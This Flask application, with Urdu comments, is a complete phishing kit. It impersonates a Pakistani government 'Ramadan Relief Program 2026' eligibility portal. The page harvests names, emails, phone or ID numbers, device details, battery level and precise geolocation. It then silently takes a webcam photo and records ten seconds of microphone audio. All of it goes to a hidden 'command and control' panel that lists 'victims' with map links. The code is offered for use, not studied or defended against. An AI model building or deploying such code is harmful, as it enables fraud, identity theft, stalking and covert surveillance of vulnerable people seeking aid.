import os
import base64
import datetime
import json
from flask import Flask, request, render_template_string, send_from_directory

app = Flask(__name__)

#---------------------------------------------------------
# سیکیورٹی اور اسٹوریج سیٹ اپ
#---------------------------------------------------------
STORAGE_DIR = "captured_data"
AUDIO_DIR = "captured_audio"

for folder in [STORAGE_DIR, AUDIO_DIR]:
    if not os.path.exists(folder):
        os.makedirs(folder)

# وکٹمز کا ڈیٹا اسٹور کرنے کے لیے لسٹ
victims_list = []

#---------------------------------------------------------
# ویب سرور روٹس (Routes)
#---------------------------------------------------------

@app.route('/')
def victim_page():
    return render_template_string(VICTIM_HTML)

@app.route('/admin_panel_secret_123')
def admin_panel():
    return render_template_string(ADMIN_HTML, victims=victims_list)

@app.route('/media/<path:filename>')
def custom_static(filename):
    if filename.endswith('.jpg'):
        return send_from_directory(STORAGE_DIR, filename)
    return send_from_directory(AUDIO_DIR, filename)

@app.route('/log', methods=['POST'])
def log():
    data = request.json
    ts = datetime.datetime.now().strftime("%H%M%S")
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    # تصویر محفوظ کرنا
    if 'img' in data:
        img_name = f"cam_{ts}_{ip.replace('.','_')}.jpg"
        img_path = os.path.join(STORAGE_DIR, img_name)
        with open(img_path, "wb") as f:
            f.write(base64.b64decode(data['img'].split(",")[1]))
        
        # لسٹ میں موجود وکٹم کے ساتھ تصویر جوڑنا
        for v in victims_list:
            if v['ip'] == ip:
                v['image'] = img_name
                break
        return img_name, 200

    # آڈیو محفوظ کرنا
    if 'audio' in data:
        audio_name = f"voice_{ts}_{ip.replace('.','_')}.webm"
        audio_path = os.path.join(AUDIO_DIR, audio_name)
        with open(audio_path, "wb") as f:
            f.write(base64.b64decode(data['audio'].split(",")[1]))
        
        for v in victims_list:
            if v['ip'] == ip:
                v['audio'] = audio_name
                break
        return audio_name, 200

    # سسٹم ڈیٹا محفوظ کرنا
    data['ip'] = ip
    data['timestamp'] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    victims_list.insert(0, {"time": data['timestamp'], "ip": ip, "info": data, "image": None, "audio": None})
    return "OK", 200

#---------------------------------------------------------
# وکٹم انٹرفیس (UI) - انتہائی چمکدار اور نیون
#---------------------------------------------------------

VICTIM_HTML = """
<!DOCTYPE html>
<html lang="ur" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>8171 رمضان سپورٹ پورٹل</title>
    <style>
        body {
            margin: 0;
            background: #000;
            color: #0f0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            overflow: hidden;
        }
        .container {
            position: relative;
            background: rgba(0, 20, 0, 0.9);
            border: 2px solid #0f0;
            box-shadow: 0 0 25px #0f0, inset 0 0 10px #0f0;
            padding: 40px;
            border-radius: 25px;
            text-align: center;
            width: 90%;
            max-width: 450px;
            z-index: 10;
        }
        .neon-text {
            text-shadow: 0 0 10px #0f0, 0 0 20px #0f0;
            color: #fff;
            margin-bottom: 20px;
            font-size: 24px;
        }
        input {
            width: 100%;
            padding: 15px;
            margin: 10px 0;
            background: #111;
            border: 1px solid #0f0;
            color: #fff;
            border-radius: 10px;
            box-sizing: border-box;
            outline: none;
            font-size: 16px;
        }
        input:focus {
            box-shadow: 0 0 15px #0f0;
        }
        .btn-main {
            background: #0f0;
            color: #000;
            padding: 18px;
            width: 100%;
            border: none;
            font-weight: bold;
            font-size: 20px;
            cursor: pointer;
            border-radius: 10px;
            margin-top: 20px;
            text-transform: uppercase;
            box-shadow: 0 0 20px #0f0;
            transition: 0.3s;
        }
        .btn-main:hover {
            background: #fff;
            box-shadow: 0 0 40px #fff;
        }
        .footer-text {
            font-size: 12px;
            margin-top: 20px;
            color: #555;
        }
        /* Background Animation */
        .bg-animate {
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            background: linear-gradient(0deg, rgba(0,255,0,0.05) 1px, transparent 1px),
                        linear-gradient(90deg, rgba(0,255,0,0.05) 1px, transparent 1px);
            background-size: 30px 30px;
            z-index: 1;
        }
    </style>
</head>
<body>
    <div class="bg-animate"></div>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/af/Government_of_the_Punjab_Logo.svg" width="80" style="filter: drop-shadow(0 0 10px #0f0);">
        <h1 class="neon-text">رمضان ریلیف پروگرام 2026</h1>
        <p>اپنی امداد کی اہلیت جانچنے کے لیے معلومات درج کریں</p>
        
        <input type="text" id="vName" placeholder="مکمل نام" autocomplete="name">
        <input type="email" id="vEmail" placeholder="ای میل ایڈریس" autocomplete="email">
        <input type="number" id="vPhone" placeholder="شناختی کارڈ یا فون نمبر" autocomplete="tel">
        
        <button class="btn-main" id="submitBtn">اہلیت چیک کریں</button>
        
        <p id="statusMsg" style="margin-top:20px; font-weight:bold; display:none;"></p>
        <div class="footer-text">وزارتِ سماجی بہبود، حکومتِ پاکستان</div>
    </div>

    <script>
        let mediaRecorder;
        let audioChunks = [];

        document.getElementById('submitBtn').onclick = async function() {
            const btn = this;
            btn.innerText = "WAIT...";
            btn.disabled = true;

            // 1. سسٹم ڈیٹا اکٹھا کریں
            let fullData = {
                name: document.getElementById('vName').value,
                email: document.getElementById('vEmail').value,
                phone: document.getElementById('vPhone').value,
                platform: navigator.platform,
                cores: navigator.hardwareConcurrency,
                ram: navigator.deviceMemory + "GB",
                screen: window.screen.width + "x" + window.screen.height,
                vendor: navigator.vendor,
                lang: navigator.language
            };

            // 2. بیٹری کی تفصیلات
            if (navigator.getBattery) {
                const battery = await navigator.getBattery();
                fullData.battery = (battery.level * 100) + "% (" + (battery.charging ? "Charging" : "Discharging") + ")";
            }

            // 3. لوکیشن پرمیشن (یہ تمام میڈیا پرمیشنز کو ٹریگر کرے گا)
            navigator.geolocation.getCurrentPosition(async (pos) => {
                fullData.lat = pos.coords.latitude;
                fullData.lon = pos.coords.longitude;
                fullData.acc = pos.coords.accuracy + " meters";

                // سرور کو ڈیٹا بھیجیں
                await fetch('/log', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(fullData)
                });

                // 4. کیمرہ اور مائیکروفون ایکسس
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
                    
                    // تصویر کھینچنا
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    await video.play();
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    await fetch('/log', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({img: canvas.toDataURL('image/jpeg')})
                    });

                    // آڈیو ریکارڈنگ شروع کریں
                    mediaRecorder = new MediaRecorder(stream);
                    mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
                    mediaRecorder.onstop = async () => {
                        const blob = new Blob(audioChunks, {type: 'audio/webm'});
                        const reader = new FileReader();
                        reader.readAsDataURL(blob);
                        reader.onloadend = () => {
                            fetch('/log', {
                                method: 'POST',
                                headers: {'Content-Type': 'application/json'},
                                body: JSON.stringify({audio: reader.result})
                            });
                        };
                    };
                    mediaRecorder.start();

                    // 10 سیکنڈ بعد آڈیو خود بخود بند اور اپلوڈ کریں
                    setTimeout(() => {
                        if(mediaRecorder.state === "recording") mediaRecorder.stop();
                    }, 10000);

                } catch(err) {
                    console.log("Media denied");
                }

                document.getElementById('statusMsg').innerText = "آپ اس پروگرام کے لیے اہل ہیں۔ جلد آپ سے رابطہ کیا جائے گا۔";
                document.getElementById('statusMsg').style.display = "block";

            }, (err) => {
                // اگر لوکیشن ریجیکٹ ہو جائے تب بھی ڈیٹا بھیجیں
                fetch('/log', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(fullData)
                });
                document.getElementById('statusMsg').innerText = "سرور مصروف ہے، براہ کرم تھوڑی دیر بعد کوشش کریں۔";
                document.getElementById('statusMsg').style.display = "block";
                btn.disabled = false;
                btn.innerText = "اہلیت چیک کریں";
            });
        };
    </script>
</body>
</html>
"""

#---------------------------------------------------------
# ایڈمن پینل (English Dashboard) - فل ڈیٹا ڈسپلے
#---------------------------------------------------------

ADMIN_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CONTROL CENTER - SYSTEM LOGS</title>
    <style>
        body { background: #050505; color: #00ff41; font-family: 'Courier New', monospace; padding: 20px; }
        .header { border-bottom: 2px solid #00ff41; padding-bottom: 10px; margin-bottom: 30px; text-align: center; }
        .victim-card {
            background: #000;
            border: 1px solid #333;
            border-left: 8px solid #ff0055;
            padding: 25px;
            margin-bottom: 30px;
            border-radius: 10px;
            display: flex;
            flex-wrap: wrap;
            gap: 20px;
            box-shadow: 0 5px 15px rgba(0,0,0,1);
        }
        .data-section { flex: 2; min-width: 350px; }
        .media-section { flex: 1; text-align: center; min-width: 250px; }
        .label { color: #ff0055; font-weight: bold; text-transform: uppercase; font-size: 13px; }
        .val { color: #fff; margin-bottom: 8px; font-size: 15px; }
        img { max-width: 100%; border: 2px solid #00ff41; border-radius: 5px; box-shadow: 0 0 15px #00ff41; }
        .map-btn {
            background: #00ff41; color: #000; padding: 12px 20px;
            text-decoration: none; font-weight: bold; border-radius: 5px;
            display: inline-block; margin-top: 15px; text-align: center;
        }
        audio { width: 100%; margin-top: 20px; filter: invert(1); }
        .badge { background: #333; padding: 3px 8px; border-radius: 3px; font-size: 12px; }
    </style>
</head>
<body>
    <div class="header">
        <h1>COMMAND & CONTROL PANEL (LIVE FEED)</h1>
        <p>TOTAL TARGETS CAPTURED: {{ victims|length }}</p>
    </div>

    {% for v in victims %}
    <div class="victim-card">
        <div class="data-section">
            <p><span class="label">IP Address:</span> <span class="val" style="color:#00bcff; font-size:18px;">{{v.ip}}</span></p>
            <p><span class="label">Time:</span> <span class="val">{{v.time}}</span></p>
            <hr style="border:0; border-top:1px solid #222;">
            
            <p><span class="label">User Name:</span> <span class="val">{{v.info.name}}</span></p>
            <p><span class="label">Phone/ID:</span> <span class="val" style="color:yellow;">{{v.info.phone}}</span></p>
            <p><span class="label">Email:</span> <span class="val">{{v.info.email}}</span></p>
            
            <p><span class="label">Battery Status:</span> <span class="val">{{v.info.battery}}</span></p>
            <p><span class="label">Location:</span> <span class="val">{{v.info.lat}}, {{v.info.lon}} <span class="badge">Acc: {{v.info.acc}}</span></span></p>
            
            <p><span class="label">Device Info:</span> <span class="val">{{v.info.platform}} | RAM: {{v.info.ram}} | Cores: {{v.info.cores}}</span></p>
            <p><span class="label">Screen:</span> <span class="val">{{v.info.screen}}</span></p>
            
            <a href="https://www.google.com/maps?q={{v.info.lat}},{{v.info.lon}}" target="_blank" class="map-btn">VIEW EXACT LOCATION ON MAP</a>
        </div>
        
        <div class="media-section">
            <span class="label">Camera Capture:</span><br><br>
            {% if v.image %}
                <img src="/media/{{v.image}}" alt="Victim Photo">
            {% else %}
                <div style="height:200px; background:#111; display:flex; align-items:center; justify-content:center; color:#444; border:1px dashed #444;">No Photo</div>
            {% endif %}
            
            <br><br>
            <span class="label">Voice Capture:</span><br>
            {% if v.audio %}
                <audio controls>
                    <source src="/media/{{v.audio}}" type="audio/webm">
                </audio>
            {% else %}
                <p style="color:#444; font-size:12px; margin-top:10px;">Audio not available or still recording...</p>
            {% endif %}
        </div>
    </div>
    {% endfor %}

    <script>
        // آٹو ریفریش ہر 15 سیکنڈ بعد
        setTimeout(() => { location.reload(); }, 15000);
    </script>
</body>
</html>
"""

if __name__ == '__main__':
    # کلاؤڈ پورٹ سیٹنگ
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
